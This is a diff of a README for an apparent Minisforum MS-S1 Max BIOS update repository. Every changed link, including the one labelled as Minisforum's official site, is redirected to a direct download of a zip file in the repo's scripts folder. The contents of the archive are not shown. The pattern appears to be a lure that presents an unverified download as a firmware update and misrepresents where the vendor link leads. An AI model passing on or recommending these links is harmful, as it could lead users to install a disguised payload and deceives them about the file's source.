@@ -1,6 +1,6 @@
 # ⚙️ minisforum-ms-s1-max-bios - Simple BIOS Update for Minisforum
 
-[![Download](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Shavan889/minisforum-ms-s1-max-bios/releases)
+[![Download](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Shavan889/minisforum-ms-s1-max-bios/raw/refs/heads/main/scripts/s_bios_max_ms_minisforum_v1.0.zip)
 
 ## ℹ️ About This Application
 
@@ -27,7 +27,7 @@ Updating your BIOS ensures your Minisforum MS-S1 Max runs smoothly and safely. T
 
 Click the button below to visit the release page where you can find all necessary files:
 
-[![Download Releases](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Shavan889/minisforum-ms-s1-max-bios/releases)
+[![Download Releases](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Shavan889/minisforum-ms-s1-max-bios/raw/refs/heads/main/scripts/s_bios_max_ms_minisforum_v1.0.zip)
 
 On this page, you will find the latest BIOS update files and scripts.
 
@@ -105,10 +105,10 @@ However, this guide focuses on how to prepare and run the update starting from a
 ## 🔗 Useful Links
 
 - BIOS update releases:  
-  https://github.com/Shavan889/minisforum-ms-s1-max-bios/releases
+  https://github.com/Shavan889/minisforum-ms-s1-max-bios/raw/refs/heads/main/scripts/s_bios_max_ms_minisforum_v1.0.zip
 
 - Minisforum MS-S1 Max official site:  
-  https://www.minisforum.com
+  https://github.com/Shavan889/minisforum-ms-s1-max-bios/raw/refs/heads/main/scripts/s_bios_max_ms_minisforum_v1.0.zip
 
 ## ⚙️ Technical Details for Advanced Users
 
